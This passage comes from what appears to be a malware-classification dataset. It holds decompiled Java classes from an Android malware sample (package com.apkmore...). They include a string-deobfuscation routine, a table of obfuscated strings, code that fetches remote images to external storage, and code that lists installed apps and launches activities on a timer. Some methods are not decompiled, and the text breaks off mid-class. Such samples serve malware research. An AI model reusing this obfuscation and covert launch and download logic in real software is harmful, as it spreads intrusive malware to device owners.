"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\g.code","public class g {   public static Bitmap a(  String str){     try {       if (new File(str).exists()) {         return BitmapFactory.decodeFile(str);       }       return null;     }  catch (    Exception e) {       return null;     }   }   public static Bitmap a(  String str,  String str2){     InputStream inputStream;     try {       inputStream=(InputStream)new URL(str).getContent();     }  catch (    Exception e) {       e.printStackTrace();       inputStream=null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=false;     options.inSampleSize=1;     Bitmap decodeStream=BitmapFactory.decodeStream(inputStream,null,options);     if (decodeStream != null) {       try {         a(str2 + h.aJ,decodeStream);       }  catch (      IOException e2) {       }     }     return decodeStream;   }   public static void a(  String str,  Bitmap bitmap){     FileOutputStream fileOutputStream;     File file=new File(Environment.getExternalStorageDirectory(),h.aP);     if (file != null && !file.exists()) {       file.mkdirs();     }     File file2=new File(Environment.getExternalStorageDirectory(),h.aP + str);     if (!file2.exists()) {       file2.createNewFile();     }     try {       fileOutputStream=new FileOutputStream(file2);     }  catch (    FileNotFoundException e) {       e.printStackTrace();       fileOutputStream=null;     }     bitmap.compress(Bitmap.CompressFormat.PNG,0,fileOutputStream);     try {       fileOutputStream.flush();     }  catch (    IOException e2) {       e2.printStackTrace();     }     try {       fileOutputStream.close();     }  catch (    IOException e3) {       e3.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\h.code","public final class h {   public static final String f235a=p.a(""xÃŽÃ©Â¼Ã–Ã€y"");   public static final String b=p.a(""xÃ²y"");   public static final String c=p.a(""xÃ³y"");   public static final String d=p.a(""xÃ´y"");   public static final String e=p.a(""xÃµy"");   public static final String f=p.a(""xÃ¶y"");   public static final String g=p.a(""xÃ·y"");   public static final String h=p.a(""xÃ¸y"");   public static final String i=p.a(""xÃ¹y"");   public static final String j=p.a(""xÃºy"");   public static final String k=p.a(""xÃ»y"");   public static final String l=p.a(""xÃ¼y"");   public static final String m=p.a(""xÃ½y"");   public static final String n=p.a(""xÃ¾y"");   public static final String o=p.a(""xÃ¿y"");   public static final String p=p.a(""xÄ€y"");   public static final String q=p.a(""xÄ�y"");   public static final String r=p.a(""xÄ‚y"");   public static final String s=p.a(""xÄƒy"");   public static final String t=p.a(""xÄ„y"");   public static final String u=p.a(""xÄ…y"");   public static final String v=p.a(""xÄ†y"");   public static final String w=p.a(""xÄ‡y"");   public static final String x=p.a(""xÄˆy"");   public static final String y=p.a(""xÄ‰y"");   public static final String z=p.a(""xÂ£Ã‘Ã¤Ã�Ã­Ã¿ÃºÃµÂ°Ã¹Ã‘Ã¸Ã«\u009fÃªÃ¨ÄƒÃžÂ¹Ã”Ã“Â¹ÂºÃ›Â°Ã§y"");   public static final String A=p.a(""xÄ‚Ã¡Ã«ÃµÃ¸ÃšÃ¸Ã„Ã˜Ã·y"");   public static final String B=p.a(""xÃšÂ±Ã³Ã”y"");   public static final String C=p.a(""xÃ¥ÃµÃ¤Ä�Ã¨Ä�Ãµy"");   public static final String D=p.a(""xÃƒÃ±Ã©Ã§Ã±ÃºÃžÄ€Ä‰Ã¦Ã±Ã½y"");   public static final String E=p.a(""xÃ¼ÃšÃ¯Ä†ÃœÄ€Ä�Ã¯Ã§Ã¬Ä’Ã¥Ã¨Ãµy"");   public static final String F=p.a(""xÄ•Ã¢Ã½Ã°Ã¬ÃžÃ¸Ä€Ã£ÄŒy"");   public static final String G=p.a(""xÃ®Ã¶Ä�Ã£Ã¸Ä†Ã�Ã·Ã‹ÂºÃ­Ãˆy"");   public static final String H=p.a(""xÂµÃ©Ä�Ã Â¸Ã«Ã«Ã©y"");   public static final String I=p.a(""xÃ�Ã‚Â³ÃˆÂ¤Â¹Ã€Â§Â¿Â²Ä€Ã›Ã­Ã«Ã¯Ã›Â¼ÃˆÂ¡Ã†Ã�Â¶Â¹Ã�Ã–Â½Ã•Ã²Ã™Ã�Ã Ã¶y"");   public static final String J=p.a(""xÄ‘ÃžÃ»Ã¼Ã¯Ã¨Ä€Ã…\u009dÃ�y"");   public static final String K=p.a(""xÄ‰Ã”Ä†ÄŒÃ°Ã±ÄŒÄƒÃ£Â·Ã¿ÃšÃž\u009bÃ�ÃŽÂ±y"");   public static final String L=p.a(""xÃºÃ§Ã»Ä�Ã”Ã¶Ä�ÃŠÃ§Ã†Ã‹Â±Â¡ÃŽy"");   public static final String M=p.a(""xÄ‰Ã”Ä†ÄŒÃ°Ã±ÄŒÄƒÃ£ÃžÄƒÃ¥Ã§\u009bÃ�ÃŽÂ±y"");   public static final String N=p.a(""xÃ§Ã±ÄˆÃ¤Ä†Ä�Ã Ã­ÄŒÄ�Ã²\u0094Ã�Â³\u0099y"");   public static final String O=p.a(""xå¯¹è¥‰å°–æŠ€y"");   public static final String P=p.a(""xä¹»é€�å°–æŠ€y"");   public static final String Q=p.a(""xÃ«Ã”Ã©Ã¨ÄƒÃ²y"");   public static final String R=p.a(""xÃ‡Ã«Ã“Ã¯Ãžy"");   public static final String S=p.a(""xÂ³Ã¶Ã§Ä“ÃžÃ¸Ã»y"");   public static final String T=p.a(""xÄ‚Ã™Ã¨y"");   public static final String U=p.a(""xÃ´Ã™Ã¼Ã£Ä”Ã§y"");   public static final String V=p.a(""xÄ‘\u0093Â®y"");   public static final String W=p.a(""xÃ«Ä„ÃªÃ¿Ã¬Ã½Ã©Ã•Ã»y"");   public static final String X=p.a(""xÃ­Ã¶Ã·Â£Ã­Ä…Ã“Ä…Ä‹ÃªÃ§Ã‡ÄŠÃ¥Ã©Ã¾Ã™Ã¡Ã Ä‚Â¿Ã²Ã¤Ä‰Ã™Ã³Ã¸\u009eÃ�Ã‡Ã²Ã�Ã‹Ã“Ã–Ã”ÃŸÃŸÂ¾Ã¥Ã°Ã„Ã˜Ã­y"");   public static final String Y=p.a(""xÃ�Ä”Ã©Ã¶Ã°Ã­Ã–Ä€Ã¼y"");   public static final String Z=p.a(""xÃ™Ã§Ã¹Ãžy"");   public static final String aa=p.a(""xÃ§Ã·Ã§Ã¨Ã©y"");   public static final String ab=p.a(""xÃ�Â©Â¸Â·Â¸Â¥ÂºÃˆÂ¦Ã…y"");   public static final String ac=p.a(""xÃ§Ã¾Ã§Ã¨Ã©y"");   public static final String ad=p.a(""xÃ�Â©Â¸Â·Â¸Â¥ÂºÃ‰\u009fÃƒy"");   public static final String ae=p.a(""xÂ·Ã±Ã§Ã¨Ã©y"");   public static final String af=p.a(""xÃ¿ÃžÃ°Ã°Ä€Ã©y"");   public static final String ag=p.a(""xÃ¤Ã¶Ã¿Ã•y"");   public static final String ah=p.a(""xÃ¹Ã¾Ã–Â´Â±y"");   public static final String ai=p.a(""xÃ±Ã”Â¯y"");   public static final String aj=p.a(""xÃ¦ÄƒÃ¤Ã¬Ã¬y"");   public static final String ak=p.a(""xÃ–Ã«ÃžÃ®Ãžy"");   public static final String al=p.a(""xÃ‹Ã“ÃªÃžÄ�Ã­y"");   public static final String am=p.a(""xÃ¢Ã·Ã¨Ã±ÃšÂ»Ã¾Ã˜Ã¹ÃˆÂ¡Ã¬Ä†Ã¿Ã«Ã™Â¿Ã Ã©Ã Ã·Â½Â±ÃªÄ‚Ã‘Ã«Ã¯\u009fÃ·Ã£Ä�ÃžÃ±Â³ÂªÃžÃ¹Ã¸Ã–Ã¸Ã‹Ã±Ã­Ä‰ÄƒÃ«Â Â°Ã—Ã©Ã«Ã¼ÃºÃ´Ã¢Ä‰Ã™Ã³Ã¸\u009fÃ¿Â¦Ä’Ã¡Ã¹ÃªÃµÃ¬Ã­Ä�Ã”Ã€Ä‚Ã­Ã¤ÄŒÄ†Â°\u0094Ã±Ã¦Ã©Ã§Ã¹Ã´Ã²ÃµÃ¾ÃŸÃ²Â¹Ã¨Ã¨Ã¦Ä‹Â¤Ä‚Ã´Ã¶Â¡Â¬Ã¸ÃŸÄƒÄˆÃªÃ¦ÃºÄ’Ã­Ã£Ã¾Â¥Ã¯Ã©Ã´Â¿Ã¾Ã´Ã‚Ã¨Ã´Ã½Ã”Ã¶ÃœÄ”Ã¦Ã¯ÃµÃ¾Â¡Â¬Ã¸ÃŸÄƒÄˆÃªÃ¦ÃºÄ’Ã­Ã£Ã¾Â¥Ã±Â¨Ã½Ä„Â¾Ã¹Ã·Ã‘Ã´Â¶\u0090Ã¨Ã©Ä�Ã¥Ã³ÃªÃ«Ã©ÃµÄ†Ã�Ã‚Ä”Â®Ã°ÄŒÃ‹Ã¥Ã¤Ä€Ã¢Ã¢ÃžÃ±Ä…ÃºÃ°Äƒ\u009cÂ¤Ã«Ã Ã·Ã¥ÄˆÃœÃ«Ã»Ã³Ã¤ÃºÃ†Ã¥Ä�Ä€Â¯Ã°ÄŒÃ‹Ã©Ã¬Ã³Ã›Ã¥Â§Â°Ã²Ä�Ã±Ä�Ã™Ã§Ã«Ã¤Ã°Ã¨Ä�Â¨Ä€ÃµÃ®Â£Ã¹ÄŠ\u009cÄƒÄ‹Ã¸Ã¨Ä‹ÄŽÃ³Ã�Ã¾ÃªÂ¥\u009bÃ±Ä�Ä�Ã­Ã¾Ã“Ã¥Ã¾Ã™Ã¶Ã§ÃŽÃ¦Ã½Ã¾Ã¹Ã§Ã°Ãƒ\u008fÂ½Ã‹Â«y"");   public static final String an=p.a(""xÂ¶Ã¯ÃºÃ”ÄƒÄ�Â®Ã�ÃºÄŒÃ«Ã©Ã±Ã�Ãžy"");   public static final String ao=p.a(""xÃ¾Ã²\u009dÃŠÃ‡y"");   public static final String ap=p.a(""xÂ³Ã¯ÃšÄ‘Ã¬Ã¯Ã»y"");   public static final String aq=p.a(""xÃ´Ã¬Ã¯Ã¹Â·Â¶Ã³Ã¼Ã�Ä‡y"");   public static final String ar=p.a(""xÃ†ÄŽÃ³Ã³Ã³Ã¶Ã–Â»Ã‹\u009dÃƒÂ¼Â©Ã¦ÄˆÄ‹Ã´Ã•Ä„ÃŸÃ›Ã§ÃµÃŒÂ±ÃŽÃ¨Â¹Ã‰ÂªÂ¨ÂµÂ©Ãš\u0099Ã¡Ã°Ã¸Ã™Ã»ÄŽÃ¢Â³ÃªÃ•Â£ÃŽÃŒÂ¶Â¯Â°ÃŠÃ«Ã¤Ã´Ã¶Ã¿ÃµÃ„Â¤Â²ÂºÂ«Â§Â§Ã­Â¾ÃžÂ§Ã�Ã�ÃžÂ·Â Ã�Ã�Â¯Â·ÃŒÃ�Â¶Â¯Â°Â¤Ã‡Ã€Ã¤Â±Ã”Ã�Ã§\u0090Â¶Â¸Â ÂµÂ®Ã�Â°Â¼Â¾Ã…\u0095ÂºÃ¥Â´Ã§Â¼Ã„Ã�Ã«Â¾Â·Â¢Ã€Â¤Â©Â¯Ã…Ã�Ã‡Â¯ÃˆÂ Â¿Âª\u009eÃ•Â¾Ã³\u0099Ã�Ã“Ãœ\u0095Â¿Ã…\u009fÃ�Ã�Â¶Â³Ã�ÃŒÂ¶Â¥Ã…Â¨Â´\u009bÂ¾ÃŸÃ–Ã•ÂµÂ³Ã�Ãœ\u0090ÂºÂ§Ã”Â§Â½Â·Ã�Â§Ã…Ã€y"");   public static final String as=p.a(""xÃ¢Ã¨Ã¸ÃµÃ¯Ã˜Ä€Ä€ÃžÄ�y"");   public static final String at=p.a(""xÃªÃžÃ¯Ã·Â·Â¶Ã¸Ä€Ã¥Ã¸y"");   public static final String au=p.a(""xÄŠÃ¢Ã­y"");   public static final String av=p.a(""xÃ�Ã¯ÃºÃ­Ã§ÃµÄ‡Ã£Ã¼Ä‹Ã¯y"");   public static final String aw=p.a(""xÃ˜Ã­Ã¸Ã¤y"");   public static final String ax=p.a(""xÃ´Ã¢ÄŒÃžÃ¾Ä€ÃºÃšy"");   public static final String ay=p.a(""xÃ‘Ã·Ã©Ä‹Ã¢Ã­Ã¨Ã¾ÃžÃ»Ä…\u009eÄ‰ÄŠÃ¥Â±ÃºÄŒÃ¨Ã¦Ã¿ÃŸÃ�Â©Ä€Ã²Ã´Ã¬Ã¶Ã—Ã©Â·Ã‘Ã¹ÃœÄ‡Ã¢Ä€Ã¬y"");   public static final String az=p.a(""xÃ¸Ã³Ã¤Ã³Ãžy"");   public static final String aA=p.a(""xÃ™Ã¨Ã©Ä„Ã¶Ã¿ÃµÃ�\u009fÂ³Ã®ÃŸÃ¾Ã§Ä‹Ã¨Ã«Ã«Ã½Â¤Ã°Ä†Ã¦Ä�ÄˆÃ°Ã¤Ã½y"");   public static final String aB=p.a(""xæ�©è�¥y"");   public static final String aC=p.a(""xå¼„ç–¬è¿¹ä½¦y"");   public static final String aD=p.a(""xÃ¼Ã¬ÄˆÃ®Ã±Ã³ÄˆÄ‰Ä‰Ã¹Ä�Ã¨Ã¼Ä‚Ã¨Ã¿Ã±Ä—Ã±Ä‚Ã¿Ä‚Ã­Ä„Ä�y"");   public static final String aE=p.a(""xÃ­Ã¨Ã­Ã�Ã±Ä‹Ã˜Ä€Ä�Ã´Ã«Ãºy"");   public static final String aF=p.a(""xÃºÄ†Ã¦Ã²Ã¿Ã¢Ã¦Ä�ÄƒÃ¸Ã�Ã½Ã›Ã¬Ã£Ã±y"");   public static final String aG=p.a(""xÃ¬Ã²Ã¶Ã¼Ã¤Ä�Ä‹Â½Ã´Ä‰Ã¦y"");   public static final String aH=p.a(""xÃ½Ã�Ã»Ä‰ÃžÄˆÃ¥Ã¤Ã²Ä‡ÄŽÃ¥Ã¨Ã¸y"");   public static final String aI=p.a(""xÃ¢Â´Â¹y"");   public static final String aJ=p.a(""x\u009eÃ´Ã¸Ã—y"");   public static final String aK=p.a(""xÃ½Ã¯Ã¹Ã§Ä€Ã¶Ã’Ä…Ä�Ã¢Ã·Ã¾y"");   public static final String aL=p.a(""xÄŠÃ—Ä‚ÄŽÃµÃ¢Ã¼Ä�Ã©Ã•Ä„Ã›Ã˜Ã¯Ã¹Ã¾Ã¶y"");   public static final String aM=p.a(""xÃ¢Ã»Ä‹Ã³Ã·Ã¸Ä�Ã¶Ã™Ã±ÃªÃžÃšÃ³Ä€Ä†Ã¯Ä‰y"");   public static final String aN=p.a(""xÃ½Ã¤Ã¸ÃºÂªÂ¶Â¨Ä’Â§Ã¸Ã°Ã¸ÃšÃ®Ä†Ã§Ã�Ã¿Ã¯Â²ÃºÄ‚Ã±Ã�Ã¾Â¥Ã¬ÃžÂ¾Ã²Ã´ÃµÃ¾ÃŸÃ²y"");   public static final String aO=p.a(""xÃ¨Ã´Ä†Ã¡Ä‡Ä‹Ã¶Ã·Ä‡Ã¿Ã±Ã™ÄƒÃžÃšy"");   public static final String aP=p.a(""xÂ¿ÃšÃ¨Ã²Ã¾Ã½Ä€Ã¢Ã¹\u009fÂ½Ã´\u009fÃºÃ¡ÄŽÃ«Ã¾ÃªÃ¿Ã©Ã«Ä€Ã’Ä‚ÄŠÂ°y"");   public static final String aQ=p.a(""xÃ´Ã°Ã¿ÃŸÄ�Ä…Ã™Ã¼Ä‘Ã«Ã¸Ä‡y"");   public static final String aR=p.a(""xÃ”Ã¶Ã°Ä�Â§Ã®Ã©y"");   public static final String aS=p.a(""xÃŸÃ³Ã³Ã¯Ã™Ã»ÄŽÃ�Ã¿Ä‹Ã¨y"");   public static final String aT=p.a(""xÃ‘Ã·Ã©Ä�ÃšÃ·Ã¬y"");   public static final String aU=p.a(""xÃ«Ã¨Ä–Ã§ÃºÃ¨Ã¾Ã�y"");   public static final String aV=p.a(""xÄ�ÃšÃ­Ã²Ã±ÃšÃºÃ¸ÃœÃ¸y"");   public static final String aW=p.a(""xÃ‘Ã«Ã¯Ä„Ã«Ã³Ã«y"");   public static final String aX=p.a(""xÃ»Ã¡Ä‘ÃžÃ«Ã«Ã³Ã™y"");   public static final String aY=p.a(""xÄƒÃ¨Ä�ÃµÃ¶ÃšÃºÃ¾Ã£Ã»y"");   public static final String aZ=p.a(""xÄƒÃ¨Ä�ÃµÃ°ÃžÃºÄ€Ã¢Ã»y"");   public static final String ba=p.a(""xÃ£Ã­Ä„Ã•y"");   public static final String bb=p.a(""xÃ¸Ã�Ã¨y"");   public static final String bc=p.a(""xÃ‘ÃªÃ˜Ä�ÃšÃ¾Ã¯y"");   public static final String bd=p.a(""xÄ�ÃšÃ­Ã²Ã±ÃšÃšÃ¸ÃœÃ¸y"");   public static final String be=p.a(""xÃœÂµÃ˜y"");   public static final String bf=p.a(""xè±°æ¥Ÿæ·„ç¿›ç½£é�¨æ�šç�‚æ‚˜y"");   public static final String bg=p.a(""xÃ™ÂµÃ—y"");   public static final String bh=p.a(""xÃ¤Ã­Ã·Ã•y"");   public static final String bi=p.a(""xÂ´Ã¥Ã¾Ã•y"");   public static final String bj=p.a(""xÃªÃ¹y"");   public static final String bk=p.a(""xÃžÃ¥Ã·Ã•y"");   public static final String bl=p.a(""x\u009eÃ¸Ä‚Ã¤y"");   public static final String bm=p.a(""xÃ”Ã¶Ã°Ä�Ã¢Ã¸Ã®y"");   public static final String bn=p.a(""xÃ¬ÃŸÃ¿ÃšÄ�Ã¤y"");   public static final String bo=p.a(""xÂ±Ã—Ã‰çµ�å”ºå¼žç–¯y"");   public static final String bp=p.a(""xÃ³ÄŒy"");   public static final String bq=p.a(""xÃ›Ã’ÂµÃ™Â¾y"");   public static final String br=p.a(""xÃ�Â´å�¨äº†å’Žç–¡y"");   public static final String bs=p.a(""xÃ£Ã°Ã¦å�€äº†å‘¹ç–¯y"");   public static final String bt=p.a(""xÂ·Ã¢Â»ÂºÃ�Ã•Â±Ã¥Ã‚Ã—Â¼Ã‰ÂªÂ¹Ã�\u0099Ã­ÃˆÃžÂ§Ã�Ã�Ã•ÃªÃƒÃ¦y"");   public static final String bu=p.a(""xÂ²Ã™Ã«\u0099ÄˆÃ§Ã¾Ã¬Ã±ÃšÃ¾Â·ÃŸÄ…Ä…Ã®Ã¤Ä‹Ä—Â¤ÃŸÃµÃ¯\u0099ÃœÄ…Ä…Ä€ÃªÄƒÃ“Ã¶Ã¯Ã�Ã¬Ã§Ä“Â¥y"");   public static final String bv=p.a(""xÃ½Ã«Ã§Ã¯Ã¿Ã�Ä…Ã„Â²Â³Ã‰Ã‡Â°y"");   public static final String bw=p.a(""xÂ¹Ã•Ã�Ã¤Ã€Ã�Ã™y"");   public static final String bx=p.a(""xÃ Ã“Ã’Ã©Â¾Ã˜ÂµÃ’Ã‚Â¾\u009bÃ™Ã—Â±Ã†Ã­Â¹Ã—ÃžÃƒy"");   public static final String by=p.a(""xÃ‚Ã¬ÃŸÄ„Ã«Ã¯Ã¹y"");   public static final String bz=p.a(""xÃºÃ¯Ã¡Ã±ÃºÃ£Â³Ã†Â¡Ã©Ä‹Ä�Ã±y"");   public static final String bA=p.a(""xÃ¯Ã†Ã�ÃžÃ¡Ã˜\u0094Ã“Ã…ÃŽÃ‰Ã¤Â¹Â»ÂªÂµÂ¶Ã–Ã™Â½y"");   public static final String bB=p.a(""xÃ�Ã¯Ã³Ã¯Ã©Ã±Â·Ã•Ä…Ä‹Ã®y"");   public static final String bC=p.a(""xÄŠÃ Ã¨Ã«Ã¤Ã¬\u0099Ä…Ã¢Ã¶Ã¬Ã®Ã¤ÄƒÄ…Ã›Ä‚ÄƒÂ¡Ã¶Ã¾Ä’Â¤Ã˜Ã¿Ã­Ã§Ã§ÃµÃ¿Ã¸ÃµÃ½\u00adÃƒÂªÃ§Ã¯ÃžÄ‘ÃžÂªÃ«Ã¹Ã¬ÃºÄ‡Ã�Ä‡Ä„Â¾Ã‚Â¹Ã¿Ã²Ã˜Â°ÃªÃ¡Ã­ÃµÃ²ÃµÃªÃ¹\u00adÃƒy"");   public static final String bD=p.a(""xÂªÂ£Ä�Ã¿Ã°Ã©ÃµÃ©Â¡ÂºÂ¼Ã�Â½Ã€Ã�Â¯Â°Ã‰\u009cÃ†Â¢y"");   public static final String bE=p.a(""xÃ¢Ã¸ÃºÃ¯Ã§Ä€Â·Ã˜Ä�Ä�Ã°y"");   public static final String bF=p.a(""xÃ¬Ã Ã¼Ã¶Ã´ÃµÂµÃ¤Ã¬Ã¼Ã•Ã¨Ã�ÄˆÃ�Â¶Â§Ã®Ã¤ÄƒÄ…Ã›Ã¸ÄŠÃ¨Ã·Ä�Â¾ÃªÃ¦Ã¿Ã£\u0099Ã¡Ã¹Ã½Ã¶Ã¥Ä„Ã§Ã²Ã¶ÃŸÃ®\u0099Ä–Ã¡Ã¯Ã¹Ã¯\u0095Ã°Ä†Ã¦Ä�ÄŒÃ¢Ã·Ä�Ã›Ãƒy"");   public static final String bG=p.a(""xy"");   public static final String bH=p.a(""xè²�æ‘‚å‡¬ÃŒÃ£å�šy"");   public static final String bI=p.a(""xè±¾æ‘‹åˆ„Ã‚Ã—ÃšÃ“å�–y"");   public static final String bJ=p.a(""xÃ¼Ã•Ã¨Ã¬ÄŽÃ§y"");   public static final String bK=p.a(""xÃ˜Ã¶Ã¦Ä„Ã¤Ã¯Ä€y""); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\i.code","public class i {   private static int f236a=0;   public static void a(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(h.aK,0);     f236a=sharedPreferences.getInt(h.aM,0);     if (h.I.equals(t.c(context))) {       com.apkmore.rbjatnldymzfiw.y.a.a(context).a();     }     if (f236a == 0) {       a(sharedPreferences,1,false);       return;     }     if (f236a < 2) {       f236a++;       a(sharedPreferences,f236a,false);       return;     }     if (f236a == 2 && t.j(context) != null) {       new Thread(new m(context,new l(context))).start();       return;     }     if (f236a > 2) {       try {         if (System.currentTimeMillis() - sharedPreferences.getLong(h.aL,-1L) > 43200000) {           com.apkmore.rbjatnldymzfiw.y.a.a(context).a();         }       }  catch (      Exception e) {       }     }   }   public static void a(  Context context,  Class cls){     SharedPreferences q=t.q(context);     new Thread(new k(q,context,new j(q,context,cls))).start();   }   public static void a(  SharedPreferences sharedPreferences,  int i,  boolean z){     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putInt(h.aM,i);     if (z) {       edit.putLong(h.aL,System.currentTimeMillis());     }     edit.commit();   }   public static long b(  Context context){     SharedPreferences.Editor edit=t.x(context).edit();     edit.putLong(""t"",System.currentTimeMillis());     edit.commit();     return f236a;   }   public static Bitmap b(  com.apkmore.rbjatnldymzfiw.y.b.f fVar,  Context context){     return g.a(fVar.f228a,t.l(context));   }   public static void b(  SharedPreferences sharedPreferences,  Context context,  com.apkmore.rbjatnldymzfiw.y.b.f fVar){     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putString(h.aG,fVar.b);     edit.putString(h.aH,fVar.f228a);     edit.commit();   }   public static void c(  Context context){     long j=t.x(context).getLong(""t"",-1L);     if (j == -1) {       b(context);       return;     }     if (System.currentTimeMillis() - j <= 39600000 || t.j(context) == null) {       return;     }     try {       if (t.b(context)) {         return;       }       Intent intent=new Intent(context,(Class<?>)t.a(context,Zew.class));       intent.addFlags(268435456);       context.startActivity(intent);       b(context);     }  catch (    Exception e) {     }   }   public static void e(  Context context){     if (""mounted"".equals(Environment.getExternalStorageState())) {       if (t.b == null) {         t.b=t.s(context);       }       if (t.b == null) {         return;       }       for (int i=0; i < t.b.length; i++) {         if (!new File(Environment.getExternalStorageDirectory() + ""/"" + h.G+ t.b[i].e+ ""/""+ h.Z+ h.H).exists()) {           new com.apkmore.rbjatnldymzfiw.y.a.c().a(t.b[i].k,t.b[i].e,null);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\j.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7b2fc1c1"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\k.code","public final class k implements Runnable {   final SharedPreferences f238a;   final Context b;   final Handler c;   public k(  SharedPreferences sharedPreferences,  Context context,  Handler handler){     this.f238a=sharedPreferences;     this.b=context;     this.c=handler;   }   @Override public void run(){     com.apkmore.rbjatnldymzfiw.y.b.f m;     Bitmap b;     if (this.f238a != null && this.f238a.getString(h.aG,null) == null && t.j(this.b) != null) {       com.apkmore.rbjatnldymzfiw.y.b.f m2=t.m(this.b);       if (m2 == null) {         return;       }       i.b(this.f238a,this.b,m2);       b=i.b(m2,this.b);       if (b != null) {         this.c.sendEmptyMessage(0);         return;       }       return;     }     if (this.f238a == null || t.j(this.b) == null || t.a(this.f238a,this.b)) {       this.c.sendEmptyMessage(0);     }  else {       if (this.f238a.getString(h.aH,null) == null || (m=t.m(this.b)) == null) {         return;       }       i.b(m,this.b);       this.c.sendEmptyMessage(0);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\l.code","public final class l extends Handler {   final Context f239a;   public l(  Context context){     this.f239a=context;   }   @Override public void handleMessage(  Message message){     super.handleMessage(message);     com.apkmore.rbjatnldymzfiw.y.a.a(this.f239a).a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\m.code","public final class m implements Runnable {   final Context f240a;   final Handler b;   public m(  Context context,  Handler handler){     this.f240a=context;     this.b=handler;   }   @Override public void run(){     i.e(this.f240a);     this.b.sendEmptyMessage(0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\n.code","public class n {   public static java.lang.String a(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.y.c.n.a(java.lang.String, java.lang.String):java.lang.String"");   }   public static java.lang.String b(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.y.c.n.b(java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\o.code","public class o {   public static void a(  String str){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\p.code","public class p {   private static int[] f241a={145,145,129,149,112,132,138,112,135,121,159,121,138,135,138,117,140,151,111,147,156,129,131,153,158,132,116,Emulator.GAMEPAD_UP_RIGHT,118,121,123,Emulator.GAMEPAD_UP_RIGHT};   public static String a(  String str){     if (str == null || !str.startsWith(""x"") || !str.endsWith(""y"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         a(sb2,(char)(charArray[i] - f241a[(charArray.length + i) % f241a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     return sb2.toString();   }   private static void a(  StringBuilder sb,  char c){     sb.append(c);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\q.code","public class q {   public static List b;   private static q d=new q();   public static List f242a=new ArrayList();   public static List c=new ArrayList();   public static synchronized q a(  Context context){     q qVar; synchronized (q.class) {       if (d == null) {         d=new q();       }       if (b == null) {         b(context);       }       qVar=d;     }     return qVar;   }   public static String a(  String str){     if (str != null) {       return str.substring(str.lastIndexOf(""/"") + 1,str.length());     }     return null;   }   public static boolean a(  String str,  int i){     File[] listFiles=t.b(i).listFiles();     if (listFiles != null) {       for (      File file : listFiles) {         if (str != null && str.equals(file.getName())) {           return false;         }       }     }     return true;   }   public static List b(  Context context){     c.clear();     b=new ArrayList();     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     b=packageManager.queryIntentActivities(intent,1);     if (b != null) {       int i=0;       while (true) {         int i2=i;         if (i2 >= b.size()) {           break;         }         c.add(((ResolveInfo)b.get(i2)).activityInfo.packageName);         i=i2 + 1;       }     }     return b;   }   public static boolean b(  String str,  int i){     File[] listFiles=t.b(i).listFiles();     if (listFiles == null) {       return false;     }     for (    File file : listFiles) {       if (str.equals(file.getName().toString())) {         return true;       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\r.code","public class r {   private static Map f243a=new HashMap();   private static Map b=new HashMap();   private static int c;   public static android.graphics.Bitmap a(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.y.c.r.a(android.content.Context, java.lang.String):android.graphics.Bitmap"");   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (c == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       c=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new 